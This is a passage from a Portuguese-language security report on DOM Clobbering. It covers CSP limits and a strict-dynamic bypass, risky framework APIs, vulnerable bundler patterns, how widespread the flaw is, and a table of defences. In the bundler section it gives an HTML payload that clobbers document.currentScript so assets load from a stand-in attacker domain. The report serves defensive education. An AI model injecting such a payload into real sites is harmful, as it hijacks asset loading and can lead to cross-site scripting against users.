const sanitizedHtml = sanitizer.sanitize(dirtyHtml);
```

Esta configuração instrui o sanitizador a remover todos os atributos `id` e `name` de todas as tags, prevenindo eficazmente o *clobbering*.

### Seção 4.3: O Papel e as Limitações da *Content Security Policy* (CSP)

A *Content Security Policy* (CSP) é uma camada de segurança poderosa que ajuda a mitigar vários tipos de ataques, incluindo XSS. Ela funciona definindo uma lista de permissões de fontes de conteúdo confiáveis que um navegador está autorizado a carregar ou executar.

#### Como a CSP Pode Ajudar

No contexto do DOM Clobbering, a CSP pode ser eficaz em um cenário específico: quando o ataque tenta escalar para XSS sobrescrevendo a fonte de um *script* (`script.src`). Se uma aplicação tiver uma CSP restritiva como `script-src 'self'`, ela impedirá que um *script* seja carregado de um domínio externo controlado pelo invasor, mesmo que o invasor consiga *clobber* a variável que define o `src`.

#### Por que a CSP Frequentemente Falha

A principal limitação da CSP como defesa contra o DOM Clobbering é que a maioria dos ataques não precisa carregar novos *scripts*. Em vez disso, eles abusam da lógica e dos *gadgets* de código que já estão presentes na página. O ataque manipula o fluxo de execução do código legítimo, em vez de injetar novo código. Por essa razão, pesquisas acadêmicas estimam que aproximadamente 85% das vulnerabilidades de DOM Clobbering encontradas na prática não podem ser mitigadas por uma CSP, por mais restritiva que seja.

#### Estudo de Caso de *Bypass* de CSP

Um cenário onde a CSP pode ser contornada envolve o uso da diretiva `strict-dynamic`. Uma CSP como `script-src 'nonce-RANDOM' 'strict-dynamic'` é considerada uma prática moderna e segura. Ela permite que um *script* inicial confiável (autenticado com um *nonce*) carregue dinamicamente outros *scripts*, que herdam essa confiança.

No entanto, se um ataque de DOM Clobbering puder manipular os dados que esse *script* confiável usa para determinar a URL do próximo *script* a ser carregado, a proteção da CSP é efetivamente contornada. O *script* confiável, agindo de acordo com as regras da CSP, acaba carregando um *script* malicioso. O DOM Clobbering atua como o elo fraco na cadeia de confiança que a `strict-dynamic` tenta estabelecer.

### Seção 4.4: Considerações sobre *Frameworks* Modernos (React, Vue, Angular)

*Frameworks* de JavaScript modernos como React, Vue e Angular mudaram a forma como os desenvolvedores interagem com o DOM, o que tem implicações para a segurança contra o DOM Clobbering.

#### Proteção Embutida e Pontos de Perigo

Em geral, esses *frameworks* oferecem uma camada de proteção inerente. Eles operam sobre um *Virtual DOM* e, por padrão, escapam ou tratam como texto quaisquer dados dinâmicos inseridos em *bindings* de atributos. Isso torna a injeção de HTML arbitrário que poderia levar ao *clobbering* muito mais difícil.

O perigo ressurge quando os desenvolvedores optam por contornar esses mecanismos de segurança para renderizar HTML bruto. Funções como `dangerouslySetInnerHTML` no React ou a diretiva `v-html` no Vue são pontos de entrada de alto risco. O HTML passado para essas funções não é processado ou sanitizado pelo *framework*, sendo inserido diretamente no DOM. Se essa entrada vier de uma fonte não confiável, ela pode introduzir vetores de *clobbering* na aplicação.

#### Vulnerabilidades no Ecossistema da *Toolchain*

Uma descoberta mais recente e preocupante é que a superfície de ataque do DOM Clobbering está se expandindo para além do código da aplicação e atingindo a *toolchain* de desenvolvimento. Ferramentas de *build* populares como Vite, Rollup e Webpack foram encontradas com vulnerabilidades que introduzem *gadgets* de DOM Clobbering no código final empacotado (*bundled*).

Um padrão vulnerável comum nessas ferramentas envolve o uso de `document.currentScript.src` para resolver caminhos relativos de *assets* (como imagens, CSS ou outros *chunks* de JS) em tempo de execução. O código gerado pelo *bundler* pode se parecer com:

```javascript
// Código gerado pelo bundler para carregar um asset
var baseUrl = new URL('.', document.currentScript.src);
var assetUrl = new URL('assets/my-image.png', baseUrl);
```

Um invasor que possa injetar HTML na página (mesmo sem *scripts*) pode *clobber* a propriedade `document.currentScript`. O *payload* seria:

```html
<img name="currentScript" src="https://attacker.com/">
```

Quando o código do *bundler* for executado, `document.currentScript` não apontará para a tag `<script>` real, mas sim para a tag `<img>` injetada. Consequentemente, `document.currentScript.src` resolverá para `https://attacker.com/`, e a aplicação tentará carregar seus *assets* a partir do domínio do invasor. Isso pode levar a XSS (se um *asset* for um *script*) ou a outros ataques.

Esta evolução da ameaça significa que os desenvolvedores não podem mais se preocupar apenas com a segurança de seu próprio código. Eles precisam estar cientes dos padrões de código que suas ferramentas de *build* geram e como esses padrões podem ser explorados. A responsabilidade se estende à auditoria e atualização de toda a cadeia de ferramentas de desenvolvimento.

## Parte V: O Cenário Atual e o Futuro do DOM Clobbering

Finalizando este relatório, esta seção oferece uma visão do estado da arte do DOM Clobbering, abordando sua prevalência no mundo real, as diferenças de comportamento entre os principais navegadores e uma conclusão que consolida as recomendações de defesa em uma estrutura acionável.

### Seção 5.1: Prevalência e Diferenças entre Navegadores

Longe de ser uma vulnerabilidade teórica ou de nicho, o DOM Clobbering é uma ameaça presente e generalizada. Estudos sistemáticos em larga escala revelaram sua prevalência em alguns dos sites mais populares da web. Uma pesquisa de 2023 que analisou os 5.000 principais sites da lista Tranco descobriu que impressionantes 9,8% deles eram vulneráveis a alguma forma de DOM Clobbering. Isso inclui nomes proeminentes como GitHub, Trello, Fandom, Vimeo e TripAdvisor, demonstrando que mesmo equipes de desenvolvimento maduras e com foco em segurança podem negligenciar essa classe de ataque sutil. Essa alta prevalência reforça a necessidade de uma maior conscientização e de ferramentas de detecção mais eficazes.

Um fator que complica tanto a exploração quanto a defesa contra o DOM Clobbering são as diferenças de comportamento entre os navegadores. Embora os principais motores de renderização — Blink (Chrome, Edge), Gecko (Firefox) e WebKit (Safari) — se esforcem para aderir às especificações da web, ainda existem inconsistências, especialmente em áreas legadas como o acesso a propriedades nomeadas.

O mesmo estudo de 2023 que analisou a prevalência também examinou o comportamento de 19 navegadores diferentes (*desktop* e *mobile*) e identificou dez "grupos comportamentais" distintos para o DOM Clobbering. Isso significa que um *payload* de *clobbering* que funciona perfeitamente em um navegador pode não ter efeito em outro. Por exemplo, historicamente, o Chrome tem seguido mais de perto a especificação que dita que múltiplos elementos com o mesmo `id` devem resultar em um `HTMLCollection`, enquanto outros navegadores podem ter retornado apenas o primeiro elemento encontrado. Outras diferenças podem surgir na forma como `toString()` é implementado para certos elementos ou quais elementos podem ser *clobbered* usando o atributo `name`.

Essa fragmentação de comportamento tem duas implicações principais. Para os invasores, a exploração confiável e *cross-browser* do DOM Clobbering pode exigir a criação de múltiplos *payloads*, um para cada família de navegadores, aumentando a complexidade do ataque. Para as equipes de segurança e desenvolvedores, isso significa que os testes de vulnerabilidade devem ser realizados em um espectro de navegadores para garantir uma cobertura completa, pois a ausência de uma vulnerabilidade no Chrome não garante sua ausência no Firefox ou Safari.

### Seção 5.2: Conclusão e Recomendações Consolidadas

O DOM Clobbering representa uma classe fascinante e perigosa de vulnerabilidades da web. Nascido de decisões de design tomadas nos primórdios da internet para conveniência do desenvolvedor, ele persiste hoje como um fantasma no sistema, uma consequência direta da impossibilidade de se romper com o passado sem quebrar uma parte significativa do ecossistema da web. Este relatório demonstrou que o DOM Clobbering não é apenas uma curiosidade teórica; é uma técnica prática usada para transformar a injeção de HTML, que de outra forma seria benigna, em uma arma capaz de corromper o estado da aplicação, contornar defesas de segurança robustas e escalar para ataques de alto impacto como *Cross-Site Scripting* e *Cross-Site Request Forgery*.

A perspectiva futura indica que o DOM Clobbering continuará a ser um vetor de ataque relevante. À medida que as defesas contra XSS direto, como sanitizadores e *Content Security Policies*, se tornam mais onipresentes e eficazes, os invasores se voltarão cada vez mais para técnicas de *bypass* e reutilização de código, onde o DOM Clobbering se destaca. A crescente complexidade dos *frameworks* de JavaScript e das cadeias de ferramentas de *build* também introduz novas e inesperadas superfícies de ataque, como visto nas vulnerabilidades de *bundlers* como Vite e Rollup.

A defesa eficaz, portanto, não pode se basear em uma única solução. Requer uma abordagem de defesa em profundidade, combinando práticas de codificação seguras, ferramentas de sanitização configuradas corretamente e uma compreensão crítica das limitações de cada camada de proteção.

**Tabela: Estratégias de Defesa contra DOM Clobbering**

| Estratégia de Defesa | Eficácia Geral | Complexidade de Implementação | Principais Limitações | Recomendação |
|----------------------|----------------|-------------------------------|-----------------------|--------------|
| Sanitização de HTML (DOMPurify) | Alta | Baixa (com configuração correta) | Requer configuração `SANITIZE_NAMED_PROPS: true` para variáveis personalizadas. Depende de atualizações constantes. | Linha de base essencial. Deve ser usada em qualquer lugar onde HTML não confiável é processado. |
| Práticas de Codificação Segura | Média a Alta | Baixa a Média | Requer disciplina da equipe. Pode ser difícil de aplicar retroativamente em bases de código grandes e legadas. | Fundamental. Adotar como padrão de codificação para novos projetos. Focar em evitar o padrão `var x = window.x || {}`. |
| Isolamento de *Namespace* | Alta | Média | Pode exigir refatoração para prefixar variáveis globais ou atributos `id`/`name` de forma consistente. | Estratégia robusta. Ideal para novas aplicações ou grandes refatorações para evitar colisões por design. |
| `Object.freeze()` | Baixa a Média | Alta | Superficial por padrão, difícil de aplicar de forma abrangente e ineficaz contra o *clobbering* de APIs nativas (~21% dos casos). | Uso tático. Considerar para objetos de configuração críticos e bem definidos, mas não como uma defesa primária. |
| *Content Security Policy* (CSP) | Baixa | Baixa a Média | Ineficaz contra a maioria dos ataques (~85%) que abusam de código já existente. Pode ser contornada. | Defesa em profundidade. Útil para prevenir a escalada para XSS via `script.src`, mas não deve ser a única proteção. |

Em última análise, a luta contra o DOM Clobbering é um microcosmo da segurança da web moderna: uma batalha contínua contra a complexidade, o legado e as interações imprevistas em um sistema em constante evolução. Apenas através de uma vigilância constante, educação e uma abordagem de segurança em camadas, os desenvolvedores podem esperar mitigar essa ameaça sutil, mas poderosa.